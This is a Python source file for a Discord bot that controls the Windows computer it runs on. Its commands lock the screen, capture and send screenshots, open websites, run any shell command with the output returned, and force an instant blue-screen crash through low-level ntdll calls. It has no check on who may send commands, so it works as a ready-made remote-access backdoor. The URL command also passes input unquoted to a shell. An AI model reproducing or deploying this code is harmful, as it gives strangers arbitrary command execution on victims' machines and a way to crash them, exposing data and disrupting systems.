from discord.ext import commands
from datetime import datetime
import validators
import subprocess
import pyautogui
import discord
import ctypes
import os


client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)


def log_command(ctx, content=None):
    # gotta fix ss cus it still doesnt log
    return f'{ctx.author} used "{ctx.message.content if not content else f"{ctx.prefix}{ctx.command} {content}"}" in "#{ctx.channel}" at {datetime.now().strftime("%H:%M:%S")}'


@client.event
async def on_ready():
    await client.tree.sync()
    logon_message = f'Logged on as {client.user}, at {datetime.now().strftime("%H:%M:%S")}, in the servers:'
    print('-' * len(logon_message))
    print(logon_message)
    for guild in client.guilds:
        print(f'"{guild.name}"')
    print('-' * len(logon_message))


@client.event
async def on_command_error(ctx, error):
    await ctx.reply(error, ephemeral=True)
    return print(
        f'{ctx.author} caused an error using "{ctx.message.content}" in "#{ctx.channel}" at {datetime.now().strftime("%H:%M:%S")}'
    )


# Bot commands
@client.hybrid_command(name="lock", with_app_command=True, description="locks the host's computer")
async def lock_command(ctx):
    subprocess.run("rundll32.exe user32.dll, LockWorkStation", shell=True)
    await ctx.reply("Computer locked successfully!", ephemeral=True)
    print(log_command(ctx))


@client.hybrid_command(name="ss", with_app_command=True, description="takes a screenshot of the host")
async def screenshot_command(ctx):
    pyautogui.screenshot("ss.png")
    await ctx.reply(file=discord.File("ss.png"), ephemeral=True)
    os.remove("ss.png")
    print(log_command(ctx))


@client.hybrid_command(name="bsod", with_app_command=True, description="makes the host's computer die instantly")
async def bsod_command(ctx):
    await ctx.reply("Trying to execute a BSOD", ephemeral=True)
    nullptr = ctypes.POINTER(ctypes.c_int)()
    ctypes.windll.ntdll.RtlAdjustPrivilege(ctypes.c_uint(19), ctypes.c_uint(1), ctypes.c_uint(0), ctypes.byref(ctypes.c_int()))
    ctypes.windll.ntdll.NtRaiseHardError(ctypes.c_ulong(0xC000007B), ctypes.c_ulong(0), nullptr, nullptr, ctypes.c_uint(6), ctypes.byref(ctypes.c_uint()))
    print(log_command(ctx))


@client.hybrid_command(name="cmd", with_app_command=True, description="executes a shell command in the host")
async def cmd_command(ctx, *, command):
    command_result = subprocess.run(command, shell=True, capture_output=True, encoding='cp858').stdout
    if command_result:
        if len(command_result) <= 1983:
            await ctx.reply(f'Command result: {command_result}', ephemeral=True)
        else:
            with open("result.txt", "w") as f:
                f.write(command_result)
            await ctx.reply(f'Command result is {len(command_result)}, sending the result in a file',
                            file=discord.File('result.txt'),
                            ephemeral=True
                            )
            os.remove("result.txt")

    else:
        await ctx.reply("Command result is None", ephemeral=True)
    print(log_command(ctx, command))


@client.hybrid_command(name="site", with_app_command=True, description="opens the specifiec site in the host")
async def site_command(ctx, site):
    if validators.url(site):
        await ctx.reply(f'Successfully started "{site}"', ephemeral=True)
        subprocess.run(f'start {site}', shell=True)
        print(log_command(ctx, site))
    else:
        raise Exception(f'"{site}" is not a valid site')


if __name__ == '__main__':
    with open("token.txt", "r") as f:
        TOKEN = f.read()
    client.run(TOKEN)
